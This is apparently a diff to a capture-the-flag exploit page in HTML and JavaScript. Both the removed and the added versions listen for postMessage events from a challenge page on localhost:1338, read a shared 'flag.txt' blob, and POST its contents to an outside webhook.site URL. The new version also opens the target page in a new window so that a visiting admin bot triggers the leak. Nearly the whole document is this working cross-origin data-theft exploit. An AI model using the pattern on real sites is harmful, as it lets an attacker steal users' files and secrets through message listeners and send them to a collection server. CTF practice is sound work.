@@ -1,77 +1,25 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>CTF Exploit</title>
-</head>
-<body>
-    <h1>CTF Exploit Page</h1>
-    <div id="status">Loading...</div>
-    <div id="output"></div>
-
+  <body>
     <script>
-        const status = document.getElementById('status');
-        const output = document.getElementById('output');
-        
-        let messageCount = 0;
-        
-        // Strategy 1: Listen for postMessage events - THIS IS THE MAIN ATTACK
-        window.addEventListener('message', function(event) {
-            messageCount++;
-            console.log('Received message #' + messageCount + ':', event);
-            
-            status.innerHTML = `Received ${messageCount} messages. Latest: ` + JSON.stringify(event.data).substring(0, 100);
-            
-            // Log all message details
-            const logDiv = document.createElement('div');
-            logDiv.innerHTML = `<strong>Message ${messageCount}:</strong><br>
-                Origin: ${event.origin}<br>
-                Data: ${JSON.stringify(event.data, null, 2)}<br><hr>`;
-            output.appendChild(logDiv);
-            
-            // Check if this is the flag sharing message
-            if (event.data && event.data.type === 'share' && event.data.files) {
-                event.data.files.forEach(file => {
-                    if (file.name === 'flag.txt') {
-                        output.innerHTML += '<strong style="color: red;">FLAG FILE DETECTED!</strong><br>';
-                        
-                        // Try to read the blob
-                        if (file.blob) {
-                            file.blob.text().then(flag => {
-                                output.innerHTML += '<strong style="color: green; font-size: 20px;">FLAG FOUND: ' + flag + '</strong><br>';
-                                
-                                // Also log to console
-                                console.log('FLAG:', flag);
-                                
-                                // Send flag to webhook (replace with your webhook URL)
-                                fetch('https://webhook.site/1b541b21-a716-4114-8883-dd4b1936f9df', {
-                                    method: 'POST',
-                                    body: JSON.stringify({flag: flag, timestamp: new Date().toISOString()}),
-                                    headers: {'Content-Type': 'application/json'}
-                                }).catch(e => console.log('Webhook failed:', e));
-                            }).catch(e => {
-                                output.innerHTML += '<strong>Error reading blob:</strong> ' + e.message + '<br>';
-                            });
-                        }
-                    }
-                });
-            }
-        });
+      // Listen for messages from the challenge page
+      window.addEventListener("message", (event) => {
+        if (event.data?.files?.length > 0) {
+          const blob = event.data.files[0].blob;
+          const reader = new FileReader();
+          reader.onload = function () {
+            fetch("https://webhook.site/1b541b21-a716-4114-8883-dd4b1936f9df", {
+              method: "POST",
+              body: reader.result,
+              headers: { "Content-Type": "text/plain" }
+            });
+          };
+          reader.readAsText(blob);
+        }
+      });
 
-        // Keep iframe for potential message relay
-        const iframe = document.createElement('iframe');
-        iframe.src = 'http://localhost:1338';
-        iframe.style.width = '100%';
-        iframe.style.height = '200px';
-        iframe.style.border = '1px solid #ccc';
-        document.body.appendChild(iframe);
-        
-        // Add some debug info
-        setTimeout(() => {
-            status.innerHTML += '<br><strong>Exploit Status:</strong> Listening for postMessage events...';
-            status.innerHTML += '<br><strong>Target:</strong> Waiting for flag sharing message from localhost:1338';
-            status.innerHTML += '<br><strong>Note:</strong> Cross-origin errors are expected and normal!';
-        }, 1000);
-
+      // Open challenge page (admin loads this, so we simulate what admin sees)
+      const w = window.open("http://localhost:1338/", "_blank");
     </script>
-</body>
+  </body>
 </html>
